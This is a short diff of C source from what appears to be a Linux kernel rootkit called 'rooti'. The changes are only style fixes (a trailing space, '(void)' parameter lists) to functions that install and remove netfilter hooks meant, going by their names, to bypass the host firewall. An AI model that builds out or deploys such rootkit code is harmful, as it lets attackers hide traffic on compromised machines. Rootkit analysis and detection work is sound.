@@ -5,7 +5,7 @@
 #include "../utils.h"
 #include "../config.h"
 
-static unsigned int rooti_netfilter_hook(void *priv, struct sk_buff *skb, 
+static unsigned int rooti_netfilter_hook(void *priv, struct sk_buff *skb,
                                          const struct nf_hook_state *state)
 {
     enum rooti_net_rule_action action;
@@ -41,7 +41,7 @@ static struct nf_hook_ops rooti_outbound_nf_hook = {
     .priority = NF_IP_PRI_FIRST
 };
 
-int rooti_install_fw_bypass_hooks()
+int rooti_install_fw_bypass_hooks(void)
 {
     int err;
 
@@ -60,7 +60,7 @@ int rooti_install_fw_bypass_hooks()
     return 0;
 }
 
-void rooti_uninstall_fw_bypass_hooks()
+void rooti_uninstall_fw_bypass_hooks(void)
 {
     nf_unregister_net_hook(&init_net, &rooti_inbound_nf_hook);
     nf_unregister_net_hook(&init_net, &rooti_outbound_nf_hook);
